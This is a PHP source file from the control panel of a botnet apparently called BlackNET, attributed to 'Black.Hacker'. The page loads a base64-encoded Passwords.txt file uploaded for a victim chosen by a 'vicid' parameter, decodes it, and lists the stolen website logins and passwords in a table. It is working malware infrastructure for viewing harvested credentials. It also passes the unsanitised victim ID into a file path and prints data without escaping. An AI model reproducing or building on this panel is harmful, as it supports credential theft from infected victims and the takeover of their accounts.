<?php
include_once 'classes/Database.php';
include_once 'session.php';

if ($user_check != $data->username || $password_check != $data->password){
    $database->redirect("logout.php");
}

$vicID = isset($_GET['vicid']) ? $_GET['vicid'] : '';
if (file_exists("upload/$vicID/Passwords.txt")){
  $fn = fopen("upload/$vicID/Passwords.txt","r");
  $text = fread($fn,filesize("upload/$vicID/Passwords.txt"));
  $text = trim(base64_decode($text));
  $lines = explode(PHP_EOL, $text);
} else {
  die("Passwords file does not exist");
}

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="favico.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Botnet Coded By Black.Hacker">
    <meta name="author" content="Black.Hacker">
	<title>BlackNET - View Passwords</title>
	<?php include_once 'components/css.php'; ?>
	<link href="asset/vendor/datatables/dataTables.bootstrap4.css" rel="stylesheet">
    <link href="asset/vendor/responsive/css/responsive.dataTables.css" rel="stylesheet">
    <link href="asset/vendor/responsive/css/responsive.bootstrap4.css" rel="stylesheet">
    <style type="text/css">
      .sticky{
        display: -webkit-box;
        display: -ms-flexbox;
        background-color: #e9ecef;
        height: 80px;
        right: 0;
        bottom: 0; 
        position: absolute;
        display: flex;
        width: 100%;
        flex-shrink: none;
      }
    </style>
</head>
<body id="page-top">
	<?php include_once 'components/header.php'; ?>
	<div id="wrapper">
      <div id="content-wrapper">
        <div class="container-fluid">
          <ol class="breadcrumb">
            <li class="breadcrumb-item">
              <a href="#">View Passwords</a>
            </li>
          </ol>
          <div class="card mb-3">
            <div class="card-header">
              <i class="fas  fa-key"></i>
              View Passwords</div>
              <div class="card-body">
              	<div class="container text-center">

              		<div class="table-responsive pt-4 pb-4">
	              		<table class="table table-bordered" id="dataTable" width="100%" cellspacing="0">
		                  <thead>
		                    <tr>
		                      <th>#</th>
		                      <th>Website</th>
		                      <th>Username</th>
		                      <th>Password</th>
		                    </tr>
		                  </thead>
		                  <tbody>
		                  	<?php $i = 1; ?>
		                  	<?php foreach ($lines as $line): ?>
                          <?php $result = explode(",", $line); ?>
		                  		<?php if ($result[1] != null && $result[2] != null): ?>
		                  		<tr>
		                  		<td><?php echo $i; ?></td>

		                  		<td><?php echo $result[0]; ?></td>

		                  		<td><?php echo $result[1]; ?></td>

		                  		<td><?php echo $result[2]; ?></td>
		                  	</tr>
		                      <?php $i++; ?>
		                  	<?php endif; ?>
		                  	<?php endforeach; ?>
		                  </tbody>
	              		</table>
              		</div>
              	</div>
           	 </div>
         </div>
      </div>
 	 </div>
	</div>
	<?php include_once 'components/footer.php'; ?>

	<?php include_once 'components/js.php'; ?>

    <script src="asset/vendor/datatables/jquery.dataTables.js"></script>
    <script src="asset/vendor/datatables/dataTables.bootstrap4.js"></script>
    <script src="asset/vendor/responsive/dataTables.responsive.js"></script>
    <script src="asset/vendor/responsive/responsive.bootstrap4.js"></script>
    <script src="asset/js/demo/datatables-demo.js"></script>
</body>
</html>
